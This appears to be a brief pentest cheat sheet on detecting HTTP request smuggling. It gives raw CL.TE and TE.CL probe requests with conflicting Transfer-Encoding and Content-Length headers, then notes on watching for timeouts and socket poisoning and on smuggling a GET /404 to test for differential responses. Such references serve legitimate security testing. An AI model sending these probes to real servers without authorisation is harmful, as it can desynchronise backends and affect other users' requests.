# CL.TE Detection

POST /
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

---

# TE.CL Detection

POST /
Transfer-Encoding: chunked
Content-Length: 6

0

X

---

# Introspection

Observe:

Timeout

Backend Wait

Socket Poisoning

---

# Differential Response

Smuggle:

GET /404

Check next request response.